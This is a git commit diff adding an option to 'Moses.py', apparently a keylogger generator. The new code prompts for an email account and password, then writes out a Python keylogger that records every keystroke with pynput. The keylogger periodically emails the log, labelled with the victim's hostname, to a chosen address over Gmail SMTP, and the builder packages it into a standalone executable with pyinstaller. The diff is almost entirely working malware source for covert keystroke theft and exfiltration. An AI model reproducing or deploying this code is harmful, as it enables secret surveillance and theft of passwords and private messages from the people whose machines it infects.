1f5d7395d3beeccb969f066d70a3ed29c8929d5b
Log1cExe <57271997+liam3424@users.noreply.github.com>
2021-03-22 12:39:29 +0200

    Update Moses.py

--- Moses.py
+++ Moses.py
@@ -116,4 +116,68 @@ with Listener(on_press=on_press) as listener:
     if Selection == "2":
         print("")
         
+        pathTwo = input(Fore.YELLOW + "What path do you want the text file to be at: " + Fore.CYAN)
+        Style.RESET_ALL
+        NameOfKeyLoggerTwo = input(
+            Fore.YELLOW + "Enter the " + Style.BRIGHT + "Key Logger name" + Style.RESET_ALL + "  : " + Fore.CYAN)
+        Style.RESET_ALL
+        EmailTwo = input(Fore.YELLOW + "Enter your " + Style.BRIGHT + "EMAIL" + Style.RESET_ALL + ":" + Fore.CYAN)
+        Style.RESET_ALL
+        EmailPassTwo = input(Fore.YELLOW + "Enter your " + Style.BRIGHT + "PASSWORD" + Style.RESET_ALL + ": " + Fore.CYAN)
+        Style.RESET_ALL
+        EmailTargetTwo = input(Fore.YELLOW + "Enter the email you want to send the logs: " + Fore.CYAN)
+        Style.RESET_ALL
+        SleepTimeTwo = input(Fore.YELLOW + "How much time to wait until sending new email (Seconds Format): " + Fore.CYAN)
+        Style.RESET_ALL
 
+        KeyLoggerCodeTwo = fr'''
+from pynput.keyboard import Key
+from pynput.keyboard import Listener
+import logging
+import time
+import threading
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+from email.mime.multipart import MIMEMultipart
+import socket
+server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+server.login('{EmailTwo}','{EmailPassTwo}')
+log_dir = r"{pathTwo}"
+logging.basicConfig(filename=(log_dir + ".txt"),
+level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def setInterval(func,time):
+    e = threading.Event()
+    while not e.wait(time):
+        func()
+        
+def SendEmail():
+    LogToSend = open(r'{pathTwo}' + '.txt', 'rt').read()
+    msg = MIMEMultipart()
+    msg['Subject'] = 'KEYLOGGER Machine Name: ' + socket.gethostname()
+    msg['From'] = '{EmailTwo}'
+    msg['To'] = '{EmailTargetTwo}'
+    msg.attach(MIMEText(str(LogToSend)))
+    attachment = MIMEText(LogToSend)
+    attachment.add_header('Content-Disposition', 'attachment', filename="LOG FILE" + ".txt")
+    msg.attach(attachment)
+    server.sendmail('{EmailTwo}', '{EmailTargetTwo}', msg.as_string())
+
+
+    def on_press(key):
+        logging.info(str(key))
+
+
+    with Listener(on_press=on_press) as listener:
+        setInterval(SendEmail, {SleepTimeTwo})
+        listener.join()
+
+        '''
+
+        f = open(F"{NameOfKeyLoggerTwo}.py", "w+")
+        f.write(KeyLoggerCodeTwo)
+        f.close()
+
+        # subprocess.call(f"pyinstaller --noconfirm --onedir --console  {NameOfKeyLoggerTwo + '.py'} ", shell=True)
+        subprocess.call(f"pyinstaller --onefile {NameOfKeyLoggerTwo + '.py'} ", shell=True)
